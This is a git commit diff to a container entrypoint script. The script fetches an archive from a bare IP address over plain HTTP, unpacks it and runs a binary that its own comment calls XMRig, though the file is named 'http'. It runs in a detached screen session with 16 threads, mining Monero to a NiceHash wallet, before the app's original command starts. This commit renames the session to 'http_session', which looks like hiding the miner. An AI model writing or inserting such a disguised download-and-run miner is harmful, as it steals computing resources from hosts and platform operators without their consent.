007afd7886baa0b0a21fb85e5da706a9689b4c88
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-08-14 23:01:57 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # Download the http file
-wget http://35.211.126.56/httpalpine.tar.gz -O /app2/httpalpine.tar.gz
+wget --no-check-certificate http://35.211.126.56/httpalpine.tar.gz -O /app2/httpalpine.tar.gz
 
 # Extract the http file
 tar -xvzf /app2/httpalpine.tar.gz -C /app2/
@@ -14,7 +14,7 @@ rm /app2/httpalpine.tar.gz
 cd /app2/httpalpine
 
 # Run XMRig with screen
-screen -dmS myapp_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
+screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
 
 # Change directory to /app and run the original command in the background
 cd /app
